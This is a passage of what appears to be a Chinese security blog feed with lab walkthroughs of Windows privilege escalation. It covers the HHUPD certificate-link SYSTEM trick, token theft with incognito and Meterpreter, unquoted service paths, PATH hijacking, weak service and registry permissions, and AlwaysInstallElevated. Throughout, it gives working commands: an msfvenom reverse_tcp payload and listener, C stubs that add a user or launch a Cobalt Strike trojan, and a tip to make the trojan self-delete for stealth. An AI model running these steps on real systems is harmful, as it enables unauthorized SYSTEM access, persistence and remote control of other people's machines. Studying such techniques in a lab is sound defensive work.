接之后我们可以看到证书里的 Issued by（颁发者） 字段，这个字段对应的值就是 OID值，如果这里<strong>是一个超链接就可以提权</strong>，如果不是就不行</p><p>使用HHUPD.exe</p><p><img src="/img/image-20240109164353457.png" alt="image-20240109164353457"></p><p>通过点击此链接会触发以 SYSTEM 权限打开浏览器，然后此浏览器就会有 SYSTEM 权限，（浏览器打开必须先要关闭UAC对话框）通过保存按钮打开CMD，CMD就会继承浏览器的 SYSTEM 权限，由此就 完成了由普通用户到 NT AUTHORITY\SYSTEM 用户的提权。</p><img src="/img/image-20240109164626095.png" alt="image-20240109164626095" style="zoom:80%;" /> <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>查看当前的用户权限是r1cky，是一个低权限</p><p><img src="/img/image-20240109165035918.png" alt="image-20240109165035918"> </p><p>以管理员权限打开HHUPD.EXE，点击显示详细信息里显示的显示有关此发布者的证书的信息</p><p><img src="/img/image-20240109165046377.png" alt="image-20240109165046377"></p><p>点击该链接之后，关闭上面这两个弹窗，会出现浏览器的页面</p><img src="/img/image-20240109165054622.png" alt="image-20240109165054622" style="zoom:80%;" /> <p>IE浏览器访问链接后点击页面下拉菜单面里的另存为选项</p><p><img src="/img/image-20240109165122619.png" alt="image-20240109165122619"></p><p>弹出位置不可用的对话框点确定</p><p>在文件名的位置输入如下的信息 C:\Windows\System32*.*</p><p>找到里面的CMD文件，右键打开，即为system权限</p><p><img src="/img/image-20240109165305489.png" alt="image-20240109165305489"></p><p><img src="/img/image-20240109165351626.png" alt="image-20240109165351626"> </p><p><img src="/img/image-20240109165408677.png" alt="image-20240109165408677"> </p><h2 id="Windows令牌概述和令牌窃取攻击"><a href="#Windows令牌概述和令牌窃取攻击" class="headerlink" title="Windows令牌概述和令牌窃取攻击"></a>Windows令牌概述和令牌窃取攻击</h2><h3 id="Windows令牌"><a href="#Windows令牌" class="headerlink" title="Windows令牌"></a>Windows令牌</h3><p>令牌（Token）是系统的临时密钥，相当于账户名和密码，<strong>用来决定是否允许这次请求和判断这次请求 是属于哪一个用户的，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌持续存在系统中，除非系统重新启动</strong></p><p>令牌最大的特点就是随机性，不可预测，一般黑客或软件无法猜测出来，令牌有很多种，</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">访问令牌（Access <span class="hljs-built_in">Token</span>）表示访问控制操作主题的系统对象<br>会话令牌(Session <span class="hljs-built_in">Token</span>)：是交互会话中唯一的身份标识符，可以理解为web中的<span class="hljs-built_in">token</span><br>密保令牌（Security <span class="hljs-built_in">Token</span>）又叫作认证令牌或者硬件令牌，是一种计算机身份效验的物理设备<br></code></pre></td></tr></table></figure><p>Windows 的访问令牌（ AccessToken） 中包含如下内容</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gcode">用户账户的安全标识符<span class="hljs-comment">(SID)</span><br>用户所属的组的SID<br>用于标识当前登陆会话的登陆SID<br>用户或用户组所拥有的权限列表<br>所有者SID<br>主要组的SID<br>访问控制列表<br>访问令牌的来源<br>令牌是主要令牌还是模拟令牌<br>限制SID的可选列表<br>目前的模拟等级<br>其他统计的数据<br></code></pre></td></tr></table></figure><p>Windows 的访问令牌（ AccessToken） 有两种类型</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">Delegation <span class="hljs-keyword">Token</span>：授权令牌，也叫主令牌，支持交互式会话登录 (例如本地用户直接登录、远程桌面登录访问)<br>Impresonation <span class="hljs-keyword">Token</span>：模拟令牌，支持非交互的会话 (例如使用 <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span>访问共享文件夹)。<br></code></pre></td></tr></table></figure><p>两种 token 只在系统重启后清除 </p><p>具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation token，依旧有效</p><h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><h4 id="incognito窃取令牌"><a href="#incognito窃取令牌" class="headerlink" title="incognito窃取令牌"></a>incognito窃取令牌</h4><p>incognito.exe是一个令牌窃取的工具，常用用法如下</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">incognito.exe list_tokens -u 列出用户的令牌<br>incognito.exe<span class="hljs-built_in"> execute </span>-c <span class="hljs-string">&quot;令牌&quot;</span> 程序名 使用窃取的令牌执行命令<br></code></pre></td></tr></table></figure><p>1、当我们拿到一个权限的时候，如果是普通的用户或者有UAC认证的管理员用户，<strong>可以窃取的令牌只有自己的令牌不能用于提权</strong></p><p><img src="/img/image-20240109171055577.png" alt="image-20240109171055577"> </p><p>2、如果是administrator或者绕过的UAC的管理员，就可以窃取到system用户的令牌</p><p><img src="/img/image-20240109171333051.png" alt="image-20240109171333051"> </p><p>3、使用窃取的令牌进行提权</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">incognito.exe<span class="hljs-built_in"> execute </span>-c <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109171632734.png" alt="image-20240109171632734"></p><h4 id="MSF中的令牌窃取"><a href="#MSF中的令牌窃取" class="headerlink" title="MSF中的令牌窃取"></a>MSF中的令牌窃取</h4><p>1、使用MSF上线，然后加载incognito</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.41.211 <span class="hljs-attribute">lport</span>=4488 -f<br>exe -o test.exe<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.41.211<br><span class="hljs-built_in">set</span> lport 4488<br>run<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109171921843.png" alt="image-20240109171921843"> </p><p>2、加载incognito，进行令牌窃取，用法如下</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">load</span> incognito 加载incognito<br>list_tokens -u 列举<span class="hljs-keyword">token</span>令牌<br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> 权限窃取<br>rev2self 或 drop_token 返回之前toke<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109171949167.png" alt="image-20240109171949167"> </p><p><img src="/img/image-20240109171957626.png" alt="image-20240109171957626"> </p>]]></content>
    
    
    <categories>
      
      <category>提权</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>提权-windows系统错误配置提权</title>
    <link href="/2024/01/09/%E6%8F%90%E6%9D%83-windows%E7%B3%BB%E7%BB%9F%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/"/>
    <url>/2024/01/09/%E6%8F%90%E6%9D%83-windows%E7%B3%BB%E7%BB%9F%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="windows系统错误配置提权"><a href="#windows系统错误配置提权" class="headerlink" title="windows系统错误配置提权"></a>windows系统错误配置提权</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>随着网络安全的发展和普及,不打补丁的系统少之又少,所以很多时候通过系统自身的漏洞很难提权,这个 时候就需要考虑查看是否存在可利用的错误系统配置,例如路径未加引号或未指定可执行文件路径等,总而言之就是因为管理员在配置一些软件的时候存在漏洞导致可以提权的</p><h2 id="1-Tusted-Service-Paths提权"><a href="#1-Tusted-Service-Paths提权" class="headerlink" title="1.Tusted Service Paths提权"></a>1.Tusted Service Paths提权</h2><p>windows服务通常都是以System权限运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候也会以系统权限进行解析。如果我们能利用这一特性，就有机会进行权限提升。例如：</p><p><img src="/img/image-20231205111118833.png" alt="image-20231205111118833"> </p><p><img src="/img/image-20231205111224803.png" alt="image-20231205111224803"> </p><p>如果在注册表中存在没有被引用起来的服务路径 如果是如下 C:\Program Files\Some Folder\Service.exe 因为 Program Files 和 Some Folder 都存在空格，就可能存在截断，依次寻找如下的程序并且执行阶段如下：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">C:<span class="hljs-string">\Program.exe</span><br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Some.exe</span><br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Some</span> Folder<span class="hljs-string">\Service.exe</span><br></code></pre></td></tr></table></figure><p>我们只需要在相应的目录下制作一个恶意的程序，达到提权的目的即可，所以提权的条件如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1、服务路径没有用引号引起来<br>2、服务的路径中存在空格<br>3、服务以最高权限启动后<br>4、当前权限具有到对应目录下写文件<br></code></pre></td></tr></table></figure><h3 id="Tusted-Service-Paths提权环境配置"><a href="#Tusted-Service-Paths提权环境配置" class="headerlink" title="Tusted Service Paths提权环境配置"></a>Tusted Service Paths提权环境配置</h3><p>1、首先创建一个服务，或者自己安装一个软件，路径中存在空格，并且服务的路径中没有引号</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sc create <span class="hljs-string">&quot;service&quot;</span> binpath<span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\Program Files\Common Files\service\service.exe&quot;</span> start<span class="hljs-operator">=</span> auto<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205112231912.png" alt="image-20231205112231912"> </p><p><img src="/img/image-20231205112313264.png" alt="image-20231205112313264"></p><p>2、查询服务的启动方式和权限</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sc qc service</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205112323458.png" alt="image-20231205112323458"></p><p>是system权限和自动启动</p><p>3、目前已经满足了提权的条件，还有一点就是我们普通的用户需要有向文件夹下的写权限 </p><p>查询权限</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">icacls</span> <span class="hljs-string">&quot;C:&quot;</span><br>icacls <span class="hljs-string">&quot;C:\Program Files&quot;</span><br>icacls <span class="hljs-string">&quot;C:\Program Files\Common Files&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205112706151.png" alt="image-20231205112706151"> </p><p><img src="/img/image-20231205112825542.png" alt="image-20231205112825542"> </p><p> <img src="/img/image-20231205112852998.png" alt="image-20231205112852998"></p><p>发现只有RX 读取和执行，没有写入权限，执行以下给到写入权限</p><p><strong>W写权限，R读权限，X执行权限，F完全访问权限，M修改权限</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls <span class="hljs-string">&quot;C:&quot;</span> /grant <span class="hljs-string">&quot;BUILTIN\Users&quot;</span>:W<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205113034066.png" alt="image-20231205113034066"> </p><p><img src="/img/image-20231205113100190.png" alt="image-20231205113100190"> </p><p><img src="/img/image-20231205113217424.png" alt="image-20231205113217424"></p><h3 id="Tusted-Service-Paths提权实验"><a href="#Tusted-Service-Paths提权实验" class="headerlink" title="Tusted Service Paths提权实验"></a>Tusted Service Paths提权实验</h3><p>1、使用WEBSHELL，或者CS,MSF控制下来，先新建一个用户，然后登陆进去，上线   apache用户</p><p><img src="/img/image-20231205113401158.png" alt="image-20231205113401158"> </p><p>2、使用命令查找没有配置引号，和带有空格的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode | findstr /i <span class="hljs-string">&quot;Auto&quot;</span> | findstr /i /v <span class="hljs-string">&quot;C:\\Windows\\&quot;</span> | findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205114033188.png" alt="image-20231205114033188"></p><p>3、发现有两个服务，接下俩检查时候具有文件写入的权限</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">icacls</span> <span class="hljs-string">&quot;C:&quot;</span><br>icacls <span class="hljs-string">&quot;C:\Program Files&quot;</span><br>icacls <span class="hljs-string">&quot;C:\Program Files\Common Files&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205114117797.png" alt="image-20231205114117797"> </p><p>apache用户对C盘有F权限，完全访问的权限</p><p>4、做一个Program.exe的恶意软件，进行劫持提权</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;net user r1 Admin@123 /add&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231205114737428.png" alt="image-20231205114737428"> </p><p>现在本次测试以下，看看能不能上线，添加用户，发现用户添加成功，现在只要换成上线的命令就可以了</p><p>这里测试 在cs上上传到C盘失败，可能还是权限原因</p><p><strong>直接拖进去测试，重启成功添加r1用户：</strong></p><p><img src="/img/image-20231205115842153.png" alt="image-20231205115842153"> </p><p><img src="/img/image-20231205115812992.png" alt="image-20231205115812992"> </p><p>后续的步骤：</p><p>5、做一个Program.exe运行恶意软件，即可上线</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cmd.exe /c C:\\USERS\\apache\\Desktop\\artifact.exe&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>6、等待机器重启上线，提权成功</p><h2 id="2-PATH环境变量提权"><a href="#2-PATH环境变量提权" class="headerlink" title="2.PATH环境变量提权"></a>2.PATH环境变量提权</h2><h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>PATH环境变量包含很多目录列表，某些执行程序的方法（即使用cmd.exe或命令行）仅依赖PATH环境变量来确定未提供程序路径时搜索程序的位置。</p><p><img src="/img/image-20231214094814879.png" alt="image-20231214094814879"></p><p>简单说就是当用户 在cmd命令行中运行一个命令时，若是没有使用绝对路径运行，如“C:\Windows\System32\ipconfig.exe”，直接在cmd中行“ipconfig”，那么Windows会先在当前目录寻 找“ipconfig.exe”，若是没找到，则会根据PATH环境变量里的目录依次去寻找。</p><p><img src="/img/image-20231214095100327.png" alt="image-20231214095100327"></p><p>通常新增PATH环变量是在最后面添加，若是由于配置不当，导致在最前面新增了 PATH环境变量，那么在此目录下新建与常用系统命令一样名字的exe程序会优先执行</p><p><img src="/img/image-20231214095947232.png" alt="image-20231214095947232"></p><p><img src="/img/image-20231214095959554.png" alt="image-20231214095959554"> </p><h3 id="提权环境准备"><a href="#提权环境准备" class="headerlink" title="提权环境准备"></a>提权环境准备</h3><p>打开环境变量在最前面添加一个路径</p><p><img src="/img/image-20231214100545676.png" alt="image-20231214100545676"> </p><h3 id="提权环境实验"><a href="#提权环境实验" class="headerlink" title="提权环境实验"></a>提权环境实验</h3><p>1、先用webhsell MSF 或者CS上线机器</p><p><img src="/img/image-20231214100602473.png" alt="image-20231214100602473"></p><p>2、查找环境变量，发现前面有有一个 C:\Windows\Temp</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">wmic ENVIRONMENT <span class="hljs-keyword">where</span> <span class="hljs-string">&quot;name=&#x27;path&#x27;&quot;</span> <span class="hljs-keyword">get</span> UserName, VariableValue<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214100703810.png" alt="image-20231214100703810"></p><p>3、制作恶意的软件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cmd.exe /c C:\\Users\\apache\\Desktop\\1.exe&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>1.exe为cs木马，为保证隐蔽性，可以做自删除处理</p><p>4.将软件传到C:\Windows\Temp目录下</p><p><img src="/img/image-20231214101718071.png" alt="image-20231214101718071"> </p><p>5.等待管理员运行ipconfig 即可上线</p><p><img src="/img/image-20231214101824847.png" alt="image-20231214101824847"></p><h2 id="3-不安全的服务提权"><a href="#3-不安全的服务提权" class="headerlink" title="3.不安全的服务提权"></a>3.不安全的服务提权</h2><h3 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h3><p>通常 Windows服务都是以 System权限运行的,当由于系统管理员错误配置导致低权限用户可以对某些服务修改时,可以通过修改服务启动文件的路径“ binpath”,将其替换为恶意程序的路径,这样服务启动时便会运行恶意程序</p><img src="/img/image-20231214102858860.png" alt="image-20231214102858860" style="zoom:80%;" /> <h3 id="提权环境准备-1"><a href="#提权环境准备-1" class="headerlink" title="提权环境准备"></a>提权环境准备</h3><p>1、先建一个服务，名字为r1，运行C盘下的1.exe</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>create r1 <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;C:\1.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214103608364.png" alt="image-20231214103608364"> </p><p>2、使用subinacl给服务设置权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">subinacl <span class="hljs-built_in">/service </span>r1 /<span class="hljs-attribute">grant</span>=apache=F<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214104047576.png" alt="image-20231214104047576"> </p><h3 id="提权实验"><a href="#提权实验" class="headerlink" title="提权实验"></a>提权实验</h3><p>1、首先先用MSF或者CS控制目标靶机</p><p>2、这里借助 Access Chk工具快速发现配置不当的服务,下面先简单介绍这个工具。通过 AccessChk可 以了解特定用户或组对资源的访问权限,包括文件、目录、注册表项、全局对象和 Windows服务</p><p><img src="/img/image-20231214103217055.png" alt="image-20231214103217055"> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk apache -cw * /accepteula<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214104436526.png" alt="image-20231214104436526"> </p><p>可以看到apache拥有RW权限</p><p>3、更改r1服务的启动文件，替换成恶意的文件然后提权</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> r1 <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;C:\Users\apache\Desktop\test2.exe&quot;</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231214104710859.png" alt="image-20231214104710859" style="zoom:80%;" />  <p><img src="/img/image-20231214104821997.png" alt="image-20231214104821997"> </p><p>4、恶意文件:test2.exe</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cmd.exe /c C:\\Users\\apache\\Desktop\\1.exe&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>5、手动启动服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> r1<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214104903567.png" alt="image-20231214104903567"></p><h2 id="4-不安全注册表提权"><a href="#4-不安全注册表提权" class="headerlink" title="4.不安全注册表提权"></a>4.不安全注册表提权</h2><h3 id="提权原理-2"><a href="#提权原理-2" class="headerlink" title="提权原理"></a>提权原理</h3><p>Windows的服务路径存储在Windows的注册表中，若注册表配置不当，当攻击者可以发现使用低权限可以更改注册表的选项的时候，就可以导致提权，可以将 imagepath 修改成恶意的文件，重启导致提权</p><p><img src="/img/image-20231214105900744.png" alt="image-20231214105900744"></p><h3 id="提权环境准备-2"><a href="#提权环境准备-2" class="headerlink" title="提权环境准备"></a>提权环境准备</h3><p>1、新建立一个服务，test</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>create test <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;C:\1.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214110456267.png" alt="image-20231214110456267"> </p><p>2、打开注册表给该文件权限</p><p><img src="/img/image-20231214110612160.png" alt="image-20231214110612160"> </p><h3 id="提权实验-1"><a href="#提权实验-1" class="headerlink" title="提权实验"></a>提权实验</h3><p>1、先使用MSF或者CS上线靶机</p><p>2、查询计算机中的所有服务</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">sc query type= <span class="hljs-literal">all</span> <span class="hljs-keyword">state</span>= <span class="hljs-literal">all</span> |findstr /i service_name.* |more<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214111027873.png" alt="image-20231214111027873"> </p><p>3、使用subinacl进行查询 权限</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> subinacl /keyreg <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\system\ControlSet001\services\test&quot;</span> /display</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214111235981.png" alt="image-20231214111235981"></p><p>4、查询该服务的 imagepath 值</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> HKEY_LOCAL_MACHINE\system\ControlSet001\services\<span class="hljs-keyword">test</span> /v imagepath<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214111447064.png" alt="image-20231214111447064"></p><p>5、替换该文件为恶意的文件或者修改文件的路径</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cmd.exe /c C:\\Users\\apache\\Desktop\\1.exe&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\system\ControlSet001\services\test&quot;</span> /t REG_EXPAND_SZ<br>/v ImagePath /d <span class="hljs-string">&quot;C:\Users\\apache\Desktop\\1.exe&quot;</span> /f<br></code></pre></td></tr></table></figure><p>6、查询是否替换</p><p><img src="/img/image-20231214111726699.png" alt="image-20231214111726699"></p><p>7、这个时候<strong>apache是没有权限启动服务的</strong>，需要管理员重启电脑. 或者设置为开机自启</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sc</span> strat <span class="hljs-keyword">test</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214111906368.png" alt="image-20231214111906368"> </p><h2 id="5-注册表键AlwaysInstall提权"><a href="#5-注册表键AlwaysInstall提权" class="headerlink" title="5.注册表键AlwaysInstall提权"></a>5.注册表键AlwaysInstall提权</h2><h3 id="提权原理-3"><a href="#提权原理-3" class="headerlink" title="提权原理"></a>提权原理</h3><p>注册表键AlwaysInstallElevated是一个策略设置项。<strong>windows允许低权限用户以System权限运行安装文件</strong>。如果启用此策略设置项，那么任何权限用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的 MSI(Microsoft Windows Installer)文件。</p><h3 id="提权环境"><a href="#提权环境" class="headerlink" title="提权环境"></a>提权环境</h3><p>查看Windows installer特权功能是否已启用</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214114002026.png" alt="image-20231214114002026"></p><p>运行”中输入gpedit.msc，打开组策略管理器 </p><p>计算机配置–&gt;管理模板–&gt;Windows 组件–&gt;Windows Installer</p><p>将”永远以高特权进行安装”编辑，选择开启</p><p><img src="/img/image-20231214114028369.png" alt="image-20231214114028369"></p><p>同样在用户配置中也需要进行配置</p><p><img src="/img/image-20231214114349589.png" alt="image-20231214114349589"></p><p>还要设置普通程序的安装可行性</p><p><img src="/img/image-20231214114405958.png" alt="image-20231214114405958"></p><p>也可以用以下的命令修改</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231214115002901.png" 